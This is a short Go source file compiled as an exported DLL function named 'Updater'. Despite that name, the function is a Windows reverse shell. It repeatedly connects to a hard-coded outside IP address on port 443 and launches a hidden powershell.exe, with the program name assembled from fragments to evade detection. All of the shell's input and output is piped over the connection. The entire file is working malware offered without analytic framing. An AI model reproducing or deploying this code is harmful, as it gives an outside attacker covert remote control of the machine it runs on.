package main

import "C"
import (
	"fmt"
	"net"
	"os/exec"
	"strings"
	"syscall"
	"time"
)

//export Updater
func Updater() {

	for {
		time.Sleep(15 * time.Second)
		caller := net.Dialer{
			Timeout: 5 * time.Second,
		}

		cop, badcop := caller.Dial("tcp", "3.22.112.123:443")
		if badcop != nil {
			continue
		}

		policeoffice := exec.Command(strings.ToLower(fmt.Sprintf("%s%s%s%s%s%s", "po", "We", "rs", "hell", ".e", "xe")))
		policeoffice.SysProcAttr = &syscall.SysProcAttr{
			HideWindow: true,
		}
		policeoffice.Stdin = cop
		policeoffice.Stdout = cop
		policeoffice.Stderr = cop
		policeoffice.Run()

	}
}

func main() {}
